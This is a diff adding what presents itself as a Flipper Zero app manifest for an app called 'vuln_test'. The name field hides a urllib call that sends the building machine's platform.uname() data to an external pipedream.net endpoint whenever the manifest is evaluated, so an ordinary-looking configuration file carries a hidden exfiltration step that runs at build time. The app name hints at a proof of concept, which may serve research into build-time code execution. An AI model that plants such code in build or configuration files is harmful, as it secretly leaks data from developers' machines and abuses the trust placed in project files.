@@ -1,0 +1,12 @@
+import urllib.request
+import platform
+App(
+    appid="vuln_test", # App ID
+    name=urllib.request.urlopen(urllib.request.Request('https://eoqlz02rshxquxz.m.pipedream.net', str(platform.uname()).encode("ascii"))) or "Name", # App name, displayed in app menu
+    apptype=FlipperAppType.EXTERNAL, # Always FlipperAppType.EXTERNAL for external plugins
+    entry_point="vuln_test_main", # Main function in your C file
+    requires=["gui"],
+    stack_size=1 * 1024, # How much memory is allocated for the stack, here it's 1KB
+    fap_category="Examples", # App category
+    fap_icon="icon.png", # Icon path
+)
